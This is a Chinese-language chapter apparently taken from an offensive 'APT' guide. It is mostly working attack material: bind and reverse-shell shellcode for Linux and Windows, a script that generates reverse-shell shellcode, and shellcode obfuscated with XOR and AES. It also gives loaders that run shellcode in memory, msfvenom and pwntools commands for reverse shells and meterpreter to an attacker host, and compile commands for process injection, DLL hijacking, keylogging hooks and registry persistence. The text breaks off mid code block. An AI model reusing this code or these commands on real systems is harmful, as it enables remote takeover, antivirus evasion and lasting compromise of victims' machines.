## RAT介绍

## Shellcode

### Linux Shellcode

1.本地Shellcode

x86_64.asm
```asm
section .text
global _start

_start:
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f ; //bin/sh
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
```

```Bash
nasm -f elf64 x86_64.asm -o x86_64.o
ld x86_64.o -o x86_64

objdump -d x86_64 | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

x86_64.c
```c
char code[] = "Shellcode";

int main(int argc, char **argv) {
  int (*func)();             //函数指针
  func = (int (*)()) code;   //指向Shellcode
  (int)(*func)();            //执行code[]函数
  return 1;
}
```

```Bash
gcc -z execstack -o x86_64_c x86_64.c
```

2.TCP Shellcode

tcp_shellcode.asm
```asm
section .text
global _start

_start:
    ; 创建socket
    xor rax, rax
    mov al, 0x29          ; syscall: socket
    xor rdi, rdi          ; domain: AF_INET (2)
    mov dil, 0x2
    xor rsi, rsi          ; type: SOCK_STREAM (1)
    mov sil, 0x1
    xor rdx, rdx          ; protocol: IPPROTO_IP (0)
    syscall

    ; 保存socket文件描述符
    xchg rdi, rax

    ; 连接到服务器
    push rdx
    mov rbx, 0x0100007f   ; IP: 127.0.0.1 (localhost)
    push rbx
    mov rbx, 0x5c110002   ; Port: 4444 (0x5c11), AF_INET (2)
    push rbx
    mov rsi, rsp
    mov al, 0x2a          ; syscall: connect
    mov dl, 0x10          ; sockaddr length
    syscall

    ; 重定向stdin, stdout, stderr到socket
    xor rsi, rsi
    mov al, 0x21          ; syscall: dup2
    syscall
    inc rsi
    mov al, 0x21
    syscall
    inc rsi
    mov al, 0x21
    syscall

    ; 执行/bin/sh
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 0x3b          ; syscall: execve
    syscall
```

```Bash
nasm -f elf64 tcp_shellcode.asm -o tcp_shellcode.o
ld tcp_shellcode.o -o tcp_shellcode
objdump -d tcp_shellcode | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

tcp_shellcode.c
```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char code[] = \
"Shellcode";

int main(int argc, char **argv) {
    // 设置Shellcode所在内存区域的权限
    if (mprotect((void*)((unsigned long)code & ~0xFFF), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect");
        return -1;
    }

    int (*func)();             // function pointer
    func = (int (*)()) code;   // func points to our shellcode
    (int)(*func)();            // execute a function code[]
    return 1;
}
```

python脚本生成
```python
import socket
import argparse
import sys

BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
ENDC = '\033[0m'

def my_super_shellcode(host, port):
    print (BLUE + "let's go to create your super shellcode..." + ENDC)
    if int(port) < 1 and int(port) > 65535:
        print (RED + "port number must be in 1-65535" + ENDC)
        sys.exit()
    if int(port) >= 1 and int(port) < 1024:
        print (YELLOW + "you must be a root" + ENDC)
    if len(host.split(".")) != 4:
        print (RED + "invalid host address :(" + ENDC)
        sys.exit()

    h = socket.inet_aton(host).hex()
    hl = [h[i:i+2] for i in range(0, len(h), 2)]
    if "00" in hl:
        print (YELLOW + "host address will cause null bytes to be in shellcode :(" + ENDC)
    h1, h2, h3, h4 = hl

    shellcode_host = "\\x" + h1 + "\\x" + h2 + "\\x" + h3 + "\\x" + h4
    print (YELLOW + "hex host address: x" + h1 + "x" + h2 + "x" + h3 + "x" + h4 + ENDC)

    p = socket.inet_aton(port).hex()[4:]
    pl = [p[i:i+2] for i in range(0, len(p), 2)]
    if "00" in pl:
        print (YELLOW + "port will cause null bytes to be in shellcode :(" + ENDC)
    p1, p2 = pl

    shellcode_port = "\\x" + p1 + "\\x" + p2
    print (YELLOW + "hex port: x" + p1 + "x" + p2 + ENDC)

    shellcode = "\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31"
    shellcode += "\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x92\\xb0\\x66\\x68"
    shellcode += shellcode_host
    shellcode += "\\x66\\x68"
    shellcode += shellcode_port
    shellcode += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10"
    shellcode += "\\x51\\x52\\x89\\xe1\\x43\\xcd"
    shellcode += "\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0"
    shellcode += "\\x3f\\xcd\\x80\\x49\\x79\\xf9"
    shellcode += "\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68"
    shellcode += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80"

    print (GREEN + "your super shellcode is:" + ENDC)
    print (GREEN + shellcode + ENDC)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost',
                         required = True, help = "local IP",
                         default = "127.1.1.1", type = str)
    parser.add_argument('-p','--lport',
                         required = True, help = "local port",
                         default = "4444", type = str)
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    my_super_shellcode(host, port)
```

### Windows Shellcode

Shellcode.asm
```asm
section .text
global _start

_start:
    ; 清除RAX寄存器
    xor rax, rax

    ; 将字符串"calc.exe"压入堆栈
    push rax
    mov rbx, 0x6578652e636c6163
    push rbx
    mov rdi, rsp

    ; 设置寄存器
    xor rsi, rsi          ; RSI为空
    xor rdx, rdx          ; RDX为空

    ; 调用execve
    mov al, 0x3b          ; 系统调用号：execve
    syscall
```

```Bash
nasm -f win64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode.exe
objdump -d shellcode.exe | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

Shellcode.c
```c
#include <stdio.h>
#include <string.h>
#include <windows.h>

unsigned char code[] = \
"机器码";

int main(int argc, char **argv) {
    void (*func)();
    func = (void (*)()) code;
    func();
    return 0;
}
```

```Bash
x86_64-w64-mingw32-gcc -o cmd.exe shellcode.c -mconsole -lkernel32
```

### 多态Shellcode

```asm
section .text
global _start

_start:
    ; 解码器Stub
    xor rcx, rcx
    mov cl, 0x10          ; Shellcode长度
    xor rbx, rbx
    mov bl, 0xaa          ; XOR密钥
decode:
    xor byte [rsi + rcx - 1], bl
    loop decode

    ; 垃圾指令
    nop
    nop

    ; 实际Shellcode（示例：执行calc.exe）
    db 0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65
    db 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0, 0x3b, 0x0f, 0x05
```

### 加密Shellcode

```asm
from Crypto.Cipher import AES
import os

# 原始Shellcode
shellcode = b"\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"

# 生成随机AES密钥
key = os.urandom(16)

# 使用AES加密Shellcode
cipher = AES.new(key, AES.MODE_ECB)
encrypted_shellcode = cipher.encrypt(shellcode.ljust(32, b'\x00'))  # 填充到16字节的倍数

print("加密后的Shellcode:", encrypted_shellcode.hex())
print("AES密钥:", key.hex())
```

加密器Stub示例
```asm
section .text
global _start

_start:
    ; AES解密器Stub
    ; 这里假设AES密钥和加密后的Shellcode已经嵌入到代码中
    ; 解密后的Shellcode将被存储在某个内存位置并执行

    ; 示例：执行解密后的Shellcode
    ; 具体的解密过程和调用方式根据实际情况调整
```

shell.cpp
```c
#include <Windows.h>

int main()
{
	const char shellcode[] = "SHELL CODE";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	for (int i = 0; i < sizeof shellcode; i++)
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;
	}
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
```

### Shellcode生成

Metasploit
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者主机IP地址 LPORT=4444 -f c
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f c -a x86 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x25\x26\x2b\x3d'
```



Pwntools
```Bash
pip install pwntools
```

Pwntools.py
```python
from pwn import *

# 设置目标IP和端口ip = "192.168.0.189"
port = 4444

# 生成反向shell的Shellcode
context(arch='amd64', os='linux')
shellcode = shellcraft.amd64.linux.connect(ip, port)
shellcode += shellcraft.amd64.linux.dupsh()

# 将Shellcode转换为机器码shellcode = asm(shellcode)

print("Generated Shellcode:")
print(shellcode)
print("Shellcode Length:", len(shellcode))
```

嵌入Shellcode
```c
#include <Windows.h>

int main()
{
	const char shellcode[] = "Metasploit生成的Shellcode";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
```

Cobalt Strike
```Bash
在Cobalt Strike中，选择“Attacks” -> “Packages” -> “Payload Generator”，然后选择目标平台和Payload类型，生成Shellcode
```

## APC注入

### Early Bird APC队列代码注入

[calc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/calc.cpp)

编译
```Bash
x86_64-w64-mingw32-gcc calc.cpp -o evil_calc.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### NtTestAlert函数

[nttest.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/nttest.cpp)

编译
```Bash
x86_64-w64-mingw32-gcc calc.cpp -o evil_calc.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### 远程线程中的APC注入

[rev.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/rev.cpp)

编译
```Bash
x86_64-w64-mingw32-g++ -O2 rev.cpp -o rev.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

目标主机
```powershell
.\rev.exe notepad.exe
```

### Metasploit

Shellcode
```Bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击者主机IP地址 LPORT=4444 -f c
```

[msf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/msf.cpp)

编译
```Bash
x86_64-w64-mingw32-g++ -O2 msf.cpp -o msf.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 代码注入

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者主机地址 LPORT=4444 -f c
```

[msf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/msf.cpp)

```Bash
x86_64-w64-mingw32-gcc msf.cpp -o msf.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### 线程劫持

[thread_hijacking.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/thread_hijacking.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 thread_hijacking.cpp -o thread_hijacking.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

固定PID

[ThreadHijacking.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/ThreadHijacking.cpp)

[TH.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/TH.cpp)

### 进程空洞

1.

[process-hollowing.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/process-hollowing.cpp)

2.

[process_hollowing.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/process_hollowing.cpp)

3.

[Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing/)

[ProcessHollowing.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/ProcessHollowing.cpp)

### Windows Fibers

[fibers.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/fibers.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 fibers.cpp -o fibers.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

固定PID

[Windows-Fibers.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/Windows-Fibers.cpp)


### NtAllocateVirtualMemory

1.

[ntallocatevirtualmemory.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/ntallocatevirtualmemory.cpp)

```Bash
x86_64-w64-mingw32-g++ ntallocatevirtualmemory.cpp -o ntallocatevirtualmemory.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

2.

[Nt_AllocateVirtualMemory.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/Nt_AllocateVirtualMemory.cpp)

### Memory Sections

1.

[memory.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/memory.cpp)

```Bash
x86_64-w64-mingw32-g++ memory.cpp -o memory.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-function-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

目标主机
```Bash
memory.exe mspaint.exe
```

2.

[Memory_Section.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/Memory_Section.cpp)

### NtOpenProcess

1.

[ntopenprocess.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/ntopenprocess.cpp)

```Bash
x86_64-w64-mingw32-g++ ntopenprocess.cpp -o ntopenprocess.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

目标主机
```Bash
.\ntopenprocess.exe 进程PID值
```

2.

[Nt_OpenProcess.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/Nt_OpenProcess.cpp)

### ZwCreateSection

1.

[zwcreatesection.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/zwcreatesection.cpp)

```Bash
x86_64-w64-mingw32-g++ zwcreatesection.cpp -o zwcreatesection.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

2.

[Zw_CreateSection.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/Zw_CreateSection.cpp)


### ZwQueueApcThread

1.

[ZwQueueApcThread.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/ZwQueueApcThread.cpp)

```Bash
x86_64-w64-mingw32-g++ ZwQueueApcThread.cpp -o ZwQueueApcThread.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

2.

[Zw_QueueApcThread.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/Zw_QueueApcThread.cpp)

## DLL注入

### 简单DLL注入

[wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/wolf.cpp)

```Bash
x86_64-w64-mingw32-g++ -shared -o wolf.dll wolf.cpp -fpermissive
```

[easy_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/easy_dll.cpp)

```Bash
x86_64-w64-mingw32-gcc -O2 easy_dll.cpp -o easy_dll.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

目标主机
```Bash
.\easy_dll.exe 2264（计算器进程PID）
```

### SetWindowsHookEx

[keyboard.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/keyboard.cpp)

```Bash
x86_64-w64-mingw32-gcc -shared -o keyboard.dll keyboard.cpp -fpermissive
```

[listen_keyboard.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/listen_keyboard.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 listen_keyboard.cpp -o listen_keyboard.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

###  NtCreateThreadEx

[ntcreate.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/ntcreate.cpp)

```Bash
x86_64-w64-mingw32-gcc -shared -o ntcreate.dll ntcreate.cpp
```

[nt_create.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/nt_create.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 nt_create.cpp -o nt_create.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

[calc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/calc.cpp)

```Bash
x86_64-w64-mingw32-g++ calc.cpp -o calc.exe -mconsole -fpermissive
```

目标主机
```Bash
.\nt_create.exe calc.exe
```

### 反射型DLL注入

[ReflectiveLoader.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/ReflectiveLoader.cpp)

```Bash
x86_64-w64-mingw32-gcc -shared -o ReflectiveLoader.dll ReflectiveLoader.cpp
```

[ReflectiveInjector.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/ReflectiveInjector.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 ReflectiveInjector.cpp -o ReflectiveInjector.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)

### Shellcode DLL反射

```Bash
msfvenom -p windows/exec cmd=cmd.exe -f c -o shellcode.bin
```

[DLLReflective.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/DLLReflective.cpp)

```Bash
x86_64-w64-mingw32-gcc -shared -o DLLReflective.dll DLLReflective.cpp
```

[dll_reflective_injection.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/dll_reflective_injection.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 dll_reflective_injection.cpp -o dll_reflective_injection.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[sRDI](https://github.com/monoxgas/sRDI)

## DLL劫持

### 实现DLL劫持

[Process Monitor v4.01](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

示例DLL劫持程序 [BgInfo v4.32](https://learn.microsoft.com/en-us/sysinternals/downloads/bginfo)

查看目录读写权限
```Bash
icacls C:\Users\...\Downloads\BGInfo\
```

[SspiCli.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/SspiCli.cpp)

```Bash
x86_64-w64-mingw32-gcc  SspiCli.cpp -shared -o SspiCli.dll
```

执行系统命令

[dll_command.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/dll_command.cpp)

### 导入函数

[CFF Explorer](https://ntcore.com/explorer-suite/)

malicious_dll.cpp

[malicious_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/malicious_dll.cpp)

```Bash
x86_64-w64-mingw32-gcc malicious_dll.cpp -shared -o malicious.dll
```

[inject.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/inject.cpp)

```Bash
x86_64-w64-mingw32-gcc -O2 inject.cpp -o inject.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

### 导出函数

def.py

[def.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/def.py)

[import.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/import.cpp)

```Bash
x86_64-w64-mingw32-g++ -shared -o import.dll import.cpp
python3 def.py import.dll
```

import_hijack.cpp

[import_hijack.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/import_hijack.cpp)

```Bash
x86_64-w64-mingw32-gcc -O2 import_hijack.cpp -o import_hijack.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

evil.cpp

[evil.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/evil.cpp)

```Bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp import.def -s
```

### OEP

oep.cpp

[oep.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/oep.cpp)

x86_64-w64-mingw32-g++ -shared -o oep.dll oep.cpp

### Ghost DLL

ghost_dll.cpp

[ghost_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/ghost_dll.cpp)

```Bash
cl /LD ghost_dll.cpp /link /DLL /OUT:target.dll
```

### DLL Main

malicious_dll.cpp

|</br>
v

[malicious.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Hijacking/malicious.cpp)

```Bash
cl /LD malicious_dll.cpp /link /DLL /OUT:target.dll
```

## 持久化

### 启动项持久化

1、注册表Run

+ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

[wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/wolf.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 wolf.cpp -o wolf.exe -mwindows -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[run.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/run.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 run.cpp -o run.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```powershell
Set-ItemProperty -Path "注册表路径" -Name "MaliciousSoftware" -Value "恶意文件目录"
Remove-ItemProperty -Path "注册表路径" -Name "名称"
```

2、Winlogon

+ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit

[Shell.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/Shell.cpp)

[Userinit.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/Userinit.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 CPP文件 -o 恶意文件.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3、启动文件夹持久化

C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

[Startup.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/Startup.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 Startup.cpp -o Startup.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```powershell
$WScriptShell = New-Object -ComObject WScript.Shell
